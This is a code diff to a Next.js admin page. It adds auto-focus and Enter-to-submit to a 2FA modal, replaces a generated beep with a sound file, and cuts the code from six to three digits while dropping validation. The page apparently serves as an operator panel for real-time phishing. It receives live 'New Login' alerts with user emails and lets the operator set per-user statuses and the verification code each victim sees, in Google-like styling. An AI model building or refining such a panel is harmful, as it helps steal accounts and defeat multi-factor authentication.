@@ -1,6 +1,6 @@
 "use client";
 
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
 import toast from "react-hot-toast";
 import { useSocket } from "../../hooks/useSocket";
@@ -40,11 +40,23 @@ export default function AdminPage() {
     const [socketConnected, setSocketConnected] = useState(false);
 
     const { socket, isConnected, connectionError } = useSocket();
+    const authCodeInputRef = useRef(null);
 
     useEffect(() => {
         setMounted(true);
         setSocketConnected(isConnected);
     }, [isConnected]);
+
+    // Auto focus on 2FA modal input
+    useEffect(() => {
+        if (show2FAModal && authCodeInputRef.current) {
+            const timer = setTimeout(() => {
+                authCodeInputRef.current.focus();
+                authCodeInputRef.current.select();
+            }, 150);
+            return () => clearTimeout(timer);
+        }
+    }, [show2FAModal]);
 
     // Check session on mount
     useEffect(() => {
@@ -111,14 +123,22 @@ export default function AdminPage() {
 
         setSummary(summaryData);
     };
+    
+    const playNotificationSound = () => {
+        const audio = new Audio("norification.wav");
+        audio.volume = 1;
+        audio.play().catch((err) => {
+            console.error("Sound play failed:", err);
+        });
+    }
 
     // Listen for socket events
     useEffect(() => {
         if (socket) {
             const handleNotification = (data) => {
-                console.log("🔔 Notification received:", data);
+                console.log(" Notification received:", data);
 
-                toast(`🔔 New Login: ${data.email || 'Unknown'}`, {
+                toast(`New Login: ${data.email || 'Unknown'}`, {
                     duration: 5000,
                     icon: '🔔',
                     style: {
@@ -128,28 +148,7 @@ export default function AdminPage() {
                     },
                 });
 
-                // Play notification sound
-                try {
-                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                    const oscillator = audioCtx.createOscillator();
-                    const gainNode = audioCtx.createGain();
-
-                    oscillator.type = 'sine';
-                    oscillator.frequency.setValueAtTime(880, audioCtx.currentTime);
-
-                    gainNode.gain.setValueAtTime(0.15, audioCtx.currentTime);
-                    gainNode.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.3);
-
-                    oscillator.connect(gainNode);
-                    gainNode.connect(audioCtx.destination);
-
-                    oscillator.start();
-                    oscillator.stop(audioCtx.currentTime + 0.3);
-                } catch (e) {
-                    console.log("Audio not available");
-                }
-
-                // Refresh user list
+                playNotificationSound();
                 fetchUsers();
             };
 
@@ -607,27 +606,32 @@ export default function AdminPage() {
                 </div>
             </div>
 
+            {/* 2FA Modal with auto focus */}
             {show2FAModal && (
                 <div className="modal-backdrop">
                     <div className="modal-card">
                         <h3 className="text-black">Set 2FA Code</h3>
-                        <p>Enter the 6-digit code that the user will see.</p>
+                        <p>Enter the 3-digit code that the user will see.</p>
                         <input
+                            ref={authCodeInputRef}
                             type="text"
                             className="text-black"
                             value={modalAuthCodeInput}
                             onChange={(e) => setModalAuthCodeInput(e.target.value)}
-                            placeholder="123456"
-                            maxLength={6}
+                            placeholder="Enter 2FA code"
+                            maxLength={3}
+                            onKeyDown={(e) => {
+                                if (e.key === 'Enter') {
+                                    e.preventDefault();
+                                    setShow2FAModal(false);
+                                    handleStatusUpdate(modalUserId, '2fa', modalAuthCodeInput.trim());
+                                }
+                            }}
                         />
                         <div className="modal-actions">
                             <button onClick={() => setShow2FAModal(false)} className="btn-cancel text-black">Cancel</button>
                             <button
                                 onClick={async () => {
-                                    if (!modalAuthCodeInput || modalAuthCodeInput.length < 6) {
-                                        toast.error('Please enter a valid 6-digit code');
-                                        return;
-                                    }
                                     setShow2FAModal(false);
                                     await handleStatusUpdate(modalUserId, '2fa', modalAuthCodeInput.trim());
                                 }}
@@ -638,14 +642,73 @@ export default function AdminPage() {
                         </div>
                     </div>
                     <style>{`
-                        .modal-backdrop { position: fixed; inset: 0; display:flex; align-items:center; justify-content:center; background: rgba(0,0,0,0.4); z-index:9999; }
-                        .modal-card { background:#fff; padding:20px; border-radius:10px; width:320px; box-shadow:0 10px 30px rgba(0,0,0,0.2); text-align:left; }
-                        .modal-card h3{ margin:0 0 8px 0; }
-                        .modal-card p{ color:#555; margin-bottom:12px; }
-                        .modal-card input{ width:100%; padding:10px; margin-bottom:12px; border:1px solid #ddd; border-radius:6px; }
-                        .modal-actions{ display:flex; justify-content:flex-end; gap:8px }
-                        .btn-cancel{ background:#f1f3f4; border:none; padding:8px 12px; border-radius:6px; cursor:pointer; }
-                        .btn-confirm{ background:#1a73e8; color:#fff; border:none; padding:8px 12px; border-radius:6px; cursor:pointer; }
+                        .modal-backdrop { 
+                            position: fixed; 
+                            inset: 0; 
+                            display: flex; 
+                            align-items: center; 
+                            justify-content: center; 
+                            background: rgba(0,0,0,0.4); 
+                            z-index: 9999; 
+                        }
+                        .modal-card { 
+                            background: #fff; 
+                            padding: 24px; 
+                            border-radius: 10px; 
+                            width: 340px; 
+                            box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
+                            text-align: left; 
+                        }
+                        .modal-card h3 { 
+                            margin: 0 0 8px 0; 
+                            color: #202124;
+                        }
+                        .modal-card p { 
+                            color: #555; 
+                            margin-bottom: 16px; 
+                        }
+                        .modal-card input { 
+                            width: 100%; 
+                            padding: 12px; 
+                            margin-bottom: 16px; 
+                            border: 2px solid #ddd; 
+                            border-radius: 6px; 
+                            font-size: 16px;
+                            transition: border-color 0.3s;
+                        }
+                        .modal-card input:focus {
+                            border-color: #1a73e8;
+                            outline: none;
+                            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.2);
+                        }
+                        .modal-actions { 
+                            display: flex; 
+                            justify-content: flex-end; 
+                            gap: 8px; 
+                        }
+                        .btn-cancel { 
+                            background: #f1f3f4; 
+                            border: none; 
+                            padding: 8px 16px; 
+                            border-radius: 6px; 
+                            cursor: pointer; 
+                            font-weight: 500;
+                        }
+                        .btn-cancel:hover {
+                            background: #e8eaed;
+                        }
+                        .btn-confirm { 
+                            background: #1a73e8; 
+                            color: #fff; 
+                            border: none; 
+                            padding: 8px 16px; 
+                            border-radius: 6px; 
+                            cursor: pointer; 
+                            font-weight: 500;
+                        }
+                        .btn-confirm:hover {
+                            background: #1557b0;
+                        }
                     `}</style>
                 </div>
             )}
